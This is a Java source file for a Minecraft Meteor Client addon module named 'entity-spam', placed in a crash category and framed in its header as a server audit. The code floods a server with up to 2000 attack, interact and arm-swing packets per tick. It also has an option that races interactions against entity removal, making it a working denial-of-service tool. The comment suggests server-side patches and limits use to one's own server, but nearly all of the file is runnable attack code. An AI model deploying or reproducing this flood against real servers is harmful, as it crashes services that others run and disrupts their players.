package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Entity Interaction Spam
 *
 * Spams attack and interact packets on the entity in the crosshair at a
 * configurable rate. Every interaction forces a server-side entity lookup,
 * permission check, combat-cooldown validation, and AC check. At high rates
 * this saturates the entity interaction pipeline and tests whether the server
 * rate-limits attack packets per-player before doing the expensive work.
 *
 * RAPID_SWING mode additionally floods arm-swing packets which trigger entity
 * animation rebroadcast to all viewers — cheap to send, O(viewers) to rebroadcast.
 *
 * Patch signal: bound per-player entity interaction rate at the packet handler
 * entry point; enforce attack cooldown server-side before touching any combat
 * state; rate-limit arm-swing rebroadcast per player per tick.
 *
 * Look at an entity, enable. Run against your OWN local server only.
 */
public class EntitySpam extends Module {
    public enum Mode { REAL_ONLY, RAPID_SWING, BOTH }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("REAL_ONLY = attack/interact the crosshair entity. RAPID_SWING = arm-swing flood. BOTH = all.")
        .defaultValue(Mode.BOTH).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("per-tick").description("Interaction packets per tick.")
        .defaultValue(100).range(1, 2000).sliderRange(1, 500).build()
    );
    private final Setting<Boolean> latchTarget = sgGeneral.add(new BoolSetting.Builder()
        .name("latch-target")
        .description("Keep firing at the first targeted entity even after it leaves view or is removed — races interactions against entity removal (criterion 2).")
        .defaultValue(false).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private Entity latched;

    public EntitySpam() {
        super(AddonTemplate.CRASH_CATEGORY, "entity-spam",
            "Spams attack/interact + arm-swing packets on the crosshair (or latched) entity. Tests interaction rate-limiting, cooldown, and removal-tick races.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; latched = null;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        Entity crosshair = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;
        if (latchTarget.get()) {
            if (crosshair != null) latched = crosshair;   // latch the most recent target, keep it after removal
        } else {
            latched = crosshair;
        }
        Entity real = latched;

        if (real == null && mode.get() == Mode.REAL_ONLY) {
            warning("Look at an entity.");
            return;
        }

        for (int i = 0; i < perTick.get(); i++) {
            if (mode.get() != Mode.RAPID_SWING && real != null) {
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.attack(real, mc.player.isSneaking()));
            packetsSent++;
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(real, mc.player.isSneaking(), Hand.MAIN_HAND));
            packetsSent++;
            }
            if (mode.get() != Mode.REAL_ONLY) {
                mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            packetsSent++;
                mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
            packetsSent++;
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
